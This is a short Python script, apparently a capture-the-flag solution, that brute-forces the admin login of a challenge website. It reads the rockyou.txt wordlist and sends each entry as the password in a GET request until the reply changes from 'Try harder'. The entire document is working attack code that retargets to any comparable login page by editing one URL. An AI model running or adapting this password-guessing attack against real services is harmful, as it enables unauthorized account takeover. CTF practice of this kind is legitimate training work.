#!/usr/bin/python3

import requests as r


counter = 0
with open('/usr/share/wordlists/rockyou.txt') as f:    
    while 1:
        line = f.readline().strip()

        URL = "http://dctf1-chall-very-secure-site.westeurope.azurecontainer.io/login.php?username=admin&password=" + line

        req = r.get(URL)

        if req.text == "Try harder":
            print("[-]{} Trying...{}".format(counter,line))
            counter += 1
            continue
        else:
            print("[+] Found: {}".format(line))
            break
        
        

